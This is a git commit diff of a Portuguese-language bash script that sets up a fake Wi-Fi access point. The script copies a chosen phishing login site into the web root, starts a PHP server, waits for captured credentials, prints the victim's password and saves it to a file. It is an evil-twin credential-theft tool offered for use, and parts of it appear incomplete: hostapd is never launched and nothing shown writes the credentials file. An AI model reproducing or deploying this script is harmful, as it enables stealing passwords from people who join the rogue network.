0580ad124d853ac7bde0fd0a74c01cfdc13dc190
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-12-26 17:51:14 -0300

    Update fakeap4.sh

--- fakeap4.sh
+++ fakeap4.sh
@@ -1,58 +1,113 @@
 #!/bin/bash
 
-interface=""
-ssid=""
-channel=""
+trap 'printf "\n"; stop; exit 1' 2
 
-start() {
-    sudo iw dev | awk '$1=="Interface"{print $2}'
-    read -p "[*] Escolha a interface para usar: " interface
+list_folders() {
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pastas disponíveis:\e[0m\n"
+  counter=1
+  for folder in sites/* ; do
+    printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $folder
+    let counter++
+  done
+}
 
-    read -p "[*] Digite o SSID para o access point: " ssid
-    read -p "[*] Digite o canal para o access point: " channel
+dependencies() {
+  command -v php dnsmasq hostapd > /dev/null 2>&1 || { echo >&2 "Instale as dependências: php, dnsmasq, hostapd. Abortando."; exit 1; }
+}
 
-    sudo systemctl stop NetworkManager
-    sudo systemctl disable NetworkManager
+extract_login_info() {
+  login_page="$use_site/login.html"
+  if [ -e "$login_page" ]; then
+    login_var=$(grep -oP 'name="login"\s+value="\K[^"]+' "$login_page")
+    senha_var=$(grep -oP 'name="senha"\s+value="\K[^"]+' "$login_page")
 
-    sudo airmon-ng check kill
-    sleep 5
+    cat <<EOL > /var/www/html/login.php
+<?php
+  \$login = '$login_var';
+  \$senha = '$senha_var';
+?>
+EOL
+  else
+    echo "Página de login não encontrada em $use_site. Abortando."
+    stop
+    exit 1
+  fi
+}
 
-    sudo airmon-ng start $interface $channel
+createpage() {
+  cp -r "$use_site"/* /var/www/html/ 2>/dev/null || { echo >&2 "Erro ao copiar os arquivos do site falso. Abortando."; stop; exit 1; }
+}
 
-    sudo service apache2 start
-
-    sudo cp -r sites/* /var/www/html/
-
-    sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
-    sudo iptables -A FORWARD -i $interface -o eth0 -j ACCEPT
-    sudo sysctl -w net.ipv4.ip_forward=1
-
-    sudo ifconfig $interface up 10.0.0.1 netmask 255.255.255.0
-    sudo systemctl start dnsmasq
-
-    sudo service apache2 restart
+server() {
+  printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando o servidor PHP...\n"
+  php -S 192.168.1.1:80 > /dev/null 2>&1 & 
+  sleep 2
+  getcredentials
 }
 
 stop() {
-    sudo service apache2 stop
-    sudo systemctl stop dnsmasq
-    sudo iptables -D POSTROUTING -t nat -o eth0 -j MASQUERADE
-    sudo iptables -D FORWARD -i $interface -o eth0 -j ACCEPT
-    sudo sysctl -w net.ipv4.ip_forward=0
-    sudo ifconfig $interface down
-    sudo airmon-ng stop $interface
-    sudo systemctl start NetworkManager
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Encerrando todas as conexões..\n" 
+  killall dnsmasq hostapd php > /dev/null 2>&1
+  sleep 4
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Reiniciando o serviço de rede..\n" 
+  service networking restart
+  sleep 5
 }
 
-case "$1" in
-    --start)
-        start
-        ;;
-    --stop)
-        stop
-        ;;
-    *)
-        echo "Uso: $0 {--start|--stop}"
-        exit 1
-        ;;
+getcredentials() {
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Aguardando credenciais...\e[0m\n"
+  while [ true ]; do
+    if [[ -e "credentials.txt" ]]; then
+      printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credenciais encontradas!\n"
+      catch_cred
+    fi
+    sleep 1
+  done 
+}
+
+catch_cred() {
+  IFS=$'\n'
+  password=$(grep -o 'Pass:.*' credentials.txt | cut -d ":" -f2)
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m SSID:\e[0m\e[1;77m %s\n\e[0m" $use_ssid
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Senha:\e[0m\e[1;77m %s\n\e[0m" $password
+  printf " SSID: %s\n" $use_ssid >> saved.credentials.txt
+  cat credentials.txt >> saved.credentials.txt
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Salvo:\e[0m\e[1;77m saved.credentials.txt\e[0m\n"
+  stop
+  exit 1
+}
+
+start() {
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha a interface de rede (ex: wlan0):\e[0m ' choosed_interface
+  dependencies
+  list_folders
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha um número de pasta:\e[0m ' folder_number
+  use_site="sites/$(ls sites | sed -n "${folder_number}p")"
+  extract_login_info
+  createpage
+  stop
+  sleep 2
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Configurando o ponto de acesso..\e[0m\n" 
+  sleep 2
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s down\n" "$choosed_interface"
+  sleep 2
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando %s para o modo monitor\n" "$choosed_interface"
+  iw dev "$choosed_interface" set type monitor
+  sleep 2
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s Up\n" "$choosed_interface"
+  ip link set "$choosed_interface" up
+  sleep 2
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface %s configurada com sucesso\n" "$choosed_interface"
+  sleep 2
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\e[0m\n"
+  sleep 2
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Para parar: ./fakeap.sh --stop\n"
+  sleep 2
+  server
+}
+
+case "$1" in --stop) stop ;; 
+*)
+start 
+;;
 esac
